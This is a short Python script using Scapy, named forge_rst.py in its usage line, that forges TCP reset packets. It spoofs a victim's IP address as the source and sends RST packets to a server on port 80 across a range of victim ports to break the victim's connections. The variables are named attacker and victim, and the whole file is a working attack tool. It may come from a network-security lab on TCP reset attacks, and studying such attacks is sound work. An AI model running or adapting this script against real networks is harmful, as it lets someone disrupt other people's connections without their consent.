from scapy.arch import conf, get_if_addr, get_if_hwaddr
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, getmacbyip
from scapy.sendrecv import sendp
from sys import argv
from time import sleep

if len(argv) != 4:
    print("Usage: forge_rst.py <interface> <victim IP address> <server IP address>")
    exit(1)

iface = argv[1]
victim = argv[2]
server = argv[3]
victim_port = range(50000, 50010)
server_port = 80

attacker = get_if_addr(iface)
attacker_mac = get_if_hwaddr(iface)
route = conf.route.route()
assert route[0] == iface and route[1] == attacker
ap = route[2]
ap_mac = getmacbyip(ap)

pkt = (
    Ether(src=attacker_mac, dst=ap_mac)
    / IP(src=victim, dst=server, ttl=1)
    / TCP(
        seq=1,
        ack=0,
        sport=victim_port,
        dport=server_port,
        flags="R",
    )
)

pkt.show()

sendp(pkt, iface=iface)
print("Packet sent")
sleep(1)
print("1 second passed")
sleep(9)
print("10 seconds passed")
